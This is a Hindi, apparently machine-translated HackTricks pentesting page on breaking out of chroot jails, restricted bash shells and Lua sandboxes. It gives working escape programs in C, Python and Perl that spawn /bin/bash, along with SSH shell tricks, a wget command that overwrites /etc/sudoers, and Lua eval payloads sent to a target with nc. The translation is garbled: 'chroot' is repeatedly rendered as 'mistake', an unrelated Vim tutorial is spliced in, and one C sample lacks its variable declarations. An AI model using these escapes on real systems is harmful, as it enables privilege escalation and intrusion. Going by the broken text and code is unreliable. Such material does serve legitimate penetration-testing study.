# जेल से बाहर निकलना

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

## **GTFOBins**

**खोजें** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **में क्या आप "शैल" गुणधर्म वाले किसी भी बाइनरी को निष्पादित कर सकते हैं**

## Chroot छुटकारा

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) से: चरणबद्ध तंत्र **गोपनीयता** के खिलाफ बचाने के लिए नहीं है। अधिकांश सिस्टमों पर, chroot संदर्भ सही ढंग से स्टैक नहीं करता है और पर्याप्त अधिकारों वाले chrooted कार्यक्रम बाहर निकलने के लिए दूसरा chroot कर सकते हैं।\
आमतौर पर इसका मतलब है कि बाहर निकलने के लिए आपको chroot के अंदर रूट होना चाहिए।

{% hint style="success" %}
**टूल** [**chw00t**](https://github.com/earthquake/chw00t) को निम्नलिखित स्थितियों का उपयोग करने और `chroot` से बाहर निकलने के लिए बनाया गया है।
{% endhint %}

### रूट + CWD

{% hint style="warning" %}
यदि आप एक चरणबद्ध में **रूट** हैं तो आप **एक और चरणबद्ध** बना सकते हैं। यह इसलिए कि 2 चरणबद्ध (लिनक्स में) साथ में नहीं हो सकते हैं, इसलिए यदि आप एक फ़ोल्डर बनाते हैं और फिर उस नए फ़ोल्डर पर एक नया chroot बनाते हैं और आप उसके बाहर होते हैं, तो आप अब **नए chroot के बाहर** होंगे और इसलिए आप FS में होंगे।

यह इसलिए होता है क्योंकि आमतौर पर chroot आपकी कार्यशाला को निर्दिष्ट नहीं करता है, इसलिए आप एक chroot बना सकते हैं लेकिन उसके बाहर होंगे।
{% endhint %}

आमतौर पर आप एक चरणबद्ध जेल में `chroot` बाइनरी नहीं मिलेगा, लेकिन आप **एक बाइनरी को कंपाइल, अपलोड और निष्पादित** कर सकते हैं:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>पर्ल</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### रूट + सहेजे गए एफडी

{% hint style="warning" %}
यह पिछले मामले के समान है, लेकिन इस मामले में **हमलावर एक फ़ाइल डेस्क्रिप्टर को वर्तमान निर्देशिका में संग्रहीत करता है** और फिर **नए फ़ोल्डर में chroot बनाता है**। अंत में, जैसा कि उसे चूर्ण में बाहरी रूप से **FD** तक पहुंच है, वह इसे एक्सेस करता है और वह **बाहर निकलता है**।
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### रूट + फोर्क + यूडीएस (यूनिक्स डोमेन सॉकेट्स)

{% hint style="warning" %}
एफडी यूनिक्स डोमेन सॉकेट्स के माध्यम से पास किया जा सकता है, इसलिए:

* एक बच्चा प्रक्रिया बनाएं (फोर्क)
* बच्चे और माता-पिता को बातचीत करने के लिए यूडीएस बनाएं
* बच्चे प्रक्रिया में चूक चलाएं एक अलग फ़ोल्डर में
* माता-पिता प्रक्रिया में, नए बच्चे प्रक्रिया चूक के बाहर के एक फ़ोल्डर का एफडी बनाएं
* यूडीएस का उपयोग करके उस एफडी को बच्चे प्रक्रिया को पास करें
* बच्चे प्रक्रिया उस एफडी में चिड़ियाघर करें, और क्योंकि यह उसके चूक के बाहर है, वह जेल से बाहर निकल जाएगा
{% endhint %}

### &#x20;रूट + माउंट

{% hint style="warning" %}
* रूट उपकरण (/) को चूक के भीतर एक निर्देशिका में माउंट करें
* उस निर्देशिका में चूक करें

यह लिनक्स में संभव है
{% endhint %}

### रूट + /proc

{% hint style="warning" %}
* चूक के भीतर एक निर्देशिका में procfs माउंट करें (यदि यह पहले से नहीं है)
* एक पिडी ढूंढ़ें जिसमें एक अलग रूट/सीडब्ल्यूडी प्रविष्टि है, जैसे: /proc/1/root
* उस प्रविष्टि में चूक करें
{% endhint %}

### रूट(?) + फोर्क

{% hint style="warning" %}
* एक फोर्क बनाएं (बच्चा प्रक्रिया) और एफएस में एक अलग फ़ोल्डर में चूक करें और उस पर सीडी करें
* माता-पिता प्रक्रिया से, बच्चे प्रक्रिया को चूक के पहले फ़ोल्डर में जहां बच्चे प्रक्रिया है, फ़ोल्डर को मूव करें
* यह बच्चे प्रक्रिया चूक के बाहर होगा
{% endhint %}

### पीट्रेस

{% hint style="warning" %}
* कुछ समय पहले उपयोगकर्ता अपनी प्रक्रियाओं को अपनी प्रक्रिया से डीबग कर सकता था... लेकिन यह अब डिफ़ॉल्ट रूप से संभव नहीं है
* फिर भी, यदि यह संभव है, तो आप प्रक्रिया में पीट्रेस कर सकते हैं और उसके भीतर एक शैलकोड को निष्पादित कर सकते हैं ([इस उदाहरण को देखें](linux-capabilities.md#cap\_sys\_ptrace))।
{% endhint %}

## बैश जेल

### जाँच

जेल के बारे में जानकारी प्राप्त करें:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### पाथ (PATH) को संशोधित करें

जांचें कि क्या आप पाथ (PATH) env चर को संशोधित कर सकते हैं।
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### विम का उपयोग करना

विम एक पाठ संपादक है जिसे लिनक्स पर उपयोग किया जा सकता है। यह एक शक्तिशाली संपादक है जो कई विशेषताओं के साथ आता है। विम का उपयोग करके, आप फ़ाइलों को संपादित कर सकते हैं, नई फ़ाइलें बना सकते हैं, और विभिन्न संपादन कार्यों को कर सकते हैं।

विम को खोलने के लिए, निम्नलिखित कमांड का उपयोग करें:
```bash
vim <फ़ाइल का नाम>
```

विम में नेविगेट करने के लिए, आप निम्नलिखित कुंजीबोर्ड शॉर्टकट का उपयोग कर सकते हैं:
- `h` - बाईं ओर जाएं
- `j` - नीचे जाएं
- `k` - ऊपर जाएं
- `l` - दाईं ओर जाएं

विम में संपादन करने के लिए, आप निम्नलिखित कुंजीबोर्ड शॉर्टकट का उपयोग कर सकते हैं:
- `i` - इंसर्ट मोड में जाएं
- `Esc` - इंसर्ट मोड से बाहर निकलें
- `:w` - फ़ाइल को सहेजें
- `:q` - विम से बाहर निकलें

विम में अन्य उपयोगी कार्यों के लिए, आप विम की डॉक्यूमेंटेशन का उपयोग कर सकते हैं। विम की डॉक्यूमेंटेशन को खोलने के लिए, निम्नलिखित कमांड का उपयोग करें:
```bash
vimtutor
```

विम एक शक्तिशाली संपादक है जिसे आपको अवश्य जानना चाहिए। इसका उपयोग करके, आप अपने लिनक्स सिस्टम पर फ़ाइलों को संपादित करने के लिए तैयार होंगे।
```bash
:set shell=/bin/sh
:shell
```
### स्क्रिप्ट बनाएं

जांचें कि क्या आप _/bin/bash_ को सामग्री के रूप में रखकर एक निष्पादन योग्य फ़ाइल बना सकते हैं।
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH से बैश प्राप्त करें

यदि आप SSH के माध्यम से पहुंच रहे हैं, तो आप बैश शैल को निष्पादित करने के लिए इस ट्रिक का उपयोग कर सकते हैं:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### घोषित करें
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

आप उदाहरण के लिए sudoers फ़ाइल को अधिलेखित कर सकते हैं।
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### अन्य चालें

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**यह पृष्ठ भी दिलचस्प हो सकता है:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python जेल

निम्नलिखित पृष्ठ पर Python जेल से बाहर निकलने के तरीके हैं:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua जेल

इस पृष्ठ पर आपको लुआ के भीतर आपके पहुंच के लिए वैश्विक फ़ंक्शन मिलेंगे: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**कमांड के निष्पादन के साथ इवैल:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
कुछ ट्रिक्स **डॉट का उपयोग न करते हुए एक पुस्तकालय के फंक्शन को कॉल करने के लिए**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
एक पुस्तकालय के कार्यों की जांच करें:
```bash
for k,v in pairs(string) do print(k,v) end
```
नोट करें कि पिछले वन लाइनर को आप **एक अलग lua पर्यावरण में प्रयोग करने पर फंक्शनों का क्रम बदल जाता है**। इसलिए, यदि आपको एक विशिष्ट फंक्शन को निष्पादित करने की आवश्यकता होती है, तो आप ब्रूट फोर्स हमला कर सकते हैं और विभिन्न lua पर्यावरणों को लोड करके le पुस्तकालय के पहले फंक्शन को बुला सकते हैं:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**इंटरैक्टिव लुआ शैल प्राप्त करें**: यदि आप सीमित लुआ शैल के अंदर हैं, तो आप नया लुआ शैल (और उम्मीद है असीमित) प्राप्त कर सकते हैं निम्नलिखित को कॉल करके:
```bash
debug.debug()
```
## संदर्भ

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (स्लाइड्स: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family) का
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**।

</details>
